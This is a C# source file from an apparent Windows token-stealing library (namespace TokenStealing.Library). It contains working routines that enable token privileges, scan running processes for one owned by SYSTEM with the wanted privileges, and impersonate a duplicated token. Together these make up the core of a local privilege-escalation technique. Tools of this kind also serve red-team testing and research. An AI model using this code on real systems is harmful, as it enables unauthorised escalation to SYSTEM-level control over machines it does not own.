using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
using TokenStealing.Interop;

namespace TokenStealing.Library
{
    using NTSTATUS = Int32;

    internal class Utilities
    {
        public static bool EnableTokenPrivileges(
            IntPtr hToken,
            List<string> requiredPrivs,
            out Dictionary<string, bool> adjustedPrivs)
        {
            var status = true;
            adjustedPrivs = new Dictionary<string, bool>();

            do
            {
                if (requiredPrivs.Count == 0)
                    break;

                status = Helpers.GetTokenPrivileges(
                    hToken,
                    out Dictionary<string, SE_PRIVILEGE_ATTRIBUTES> availablePrivs);

                if (!status)
                    break;

                foreach (var priv in requiredPrivs)
                {
                    adjustedPrivs.Add(priv, false);

                    foreach (var available in availablePrivs)
                    {
                        if (Helpers.CompareIgnoreCase(available.Key, priv))
                        {
                            if ((available.Value & SE_PRIVILEGE_ATTRIBUTES.ENABLED) > 0)
                            {
                                adjustedPrivs[priv] = true;
                            }
                            else
                            {
                                var tokenPrivileges = new TOKEN_PRIVILEGES(1);

                                if (NativeMethods.LookupPrivilegeValue(
                                    null,
                                    priv,
                                    out tokenPrivileges.Privileges[0].Luid))
                                {
                                    tokenPrivileges.Privileges[0].Attributes = (int)SE_PRIVILEGE_ATTRIBUTES.ENABLED;
                                    adjustedPrivs[priv] = NativeMethods.AdjustTokenPrivileges(
                                        hToken,
                                        false,
                                        in tokenPrivileges,
                                        20,
                                        out TOKEN_PRIVILEGES _,
                                        out int _);
                                }
                            }

                            break;
                        }
                    }

                    if (!adjustedPrivs[priv])
                        status = false;
                }
            } while (false);

            return status;
        }


        public static IntPtr GetSystemProcessHandle(
            List<string> requiredPrivileges,
            out int pid,
            out string processName)
        {
            bool status;
            var hProcess = IntPtr.Zero;
            pid = -1;
            processName = null;

            foreach (Process proc in Process.GetProcesses())
            {
                string tokenUserSid = null;
                hProcess = NativeMethods.OpenProcess(
                    ACCESS_MASK.PROCESS_QUERY_LIMITED_INFORMATION,
                    false,
                    proc.Id);

                if (hProcess != IntPtr.Zero)
                {
                    status = NativeMethods.OpenProcessToken(
                        hProcess,
                        ACCESS_MASK.TOKEN_QUERY | ACCESS_MASK.TOKEN_DUPLICATE,
                        out IntPtr hToken);

                    if (status)
                    {
                        tokenUserSid = Helpers.GetTokenUserSid(hToken);
                        Helpers.GetTokenPrivileges(hToken, out Dictionary<string, SE_PRIVILEGE_ATTRIBUTES> privileges);
                        NativeMethods.NtClose(hToken);

                        if (Helpers.CompareIgnoreCase(tokenUserSid, "S-1-5-18"))
                        {
                            var available = true;

                            if (requiredPrivileges.Count > 0)
                            {
                                foreach (var privilege in requiredPrivileges)
                                {
                                    available = false;

                                    foreach (var key in privileges.Keys)
                                    {
                                        if (Helpers.CompareIgnoreCase(key, privilege))
                                        {
                                            available = true;
                                            break;
                                        }
                                    }

                                    if (!available)
                                        break;
                                }
                            }

                            if (available)
                            {
                                pid = proc.Id;
                                processName = proc.ProcessName;
                                break;
                            }
                            else
                            {
                                NativeMethods.NtClose(hProcess);
                                hProcess = IntPtr.Zero;
                            }
                        }
                        else
                        {
                            NativeMethods.NtClose(hProcess);
                            hProcess = IntPtr.Zero;
                        }
                    }
                    else
                    {
                        NativeMethods.NtClose(hProcess);
                        hProcess = IntPtr.Zero;
                    }
                }
            }

            return hProcess;
        }


        public static bool ImpersonateThreadToken(IntPtr hImpersonateToken)
        {
            NTSTATUS ntstatus;
            IntPtr pImpersonationLevel = Marshal.AllocHGlobal(4);
            var status = NativeMethods.ImpersonateLoggedOnUser(hImpersonateToken);

            if (status)
            {
                SECURITY_IMPERSONATION_LEVEL intendedLevel;
                SECURITY_IMPERSONATION_LEVEL currentLevel;
                IntPtr hCurrentToken = WindowsIdentity.GetCurrent().Token;
                status = false;

                do
                {
                    ntstatus = NativeMethods.NtQueryInformationToken(
                        hImpersonateToken,
                        TOKEN_INFORMATION_CLASS.TokenImpersonationLevel,
                        pImpersonationLevel,
                        4u,
                        out uint _);

                    if (ntstatus != Win32Consts.STATUS_SUCCESS)
                        break;
                    else
                        intendedLevel = (SECURITY_IMPERSONATION_LEVEL)Marshal.ReadInt32(pImpersonationLevel);

                    ntstatus = NativeMethods.NtQueryInformationToken(
                        hCurrentToken,
                        TOKEN_INFORMATION_CLASS.TokenImpersonationLevel,
                        pImpersonationLevel,
                        4u,
                        out uint _);

                    if (ntstatus != Win32Consts.STATUS_SUCCESS)
                        break;
                    else
                        currentLevel = (SECURITY_IMPERSONATION_LEVEL)Marshal.ReadInt32(pImpersonationLevel);

                    status = (intendedLevel == currentLevel);
                } while (false);
            }

            return status;
        }
    }
}
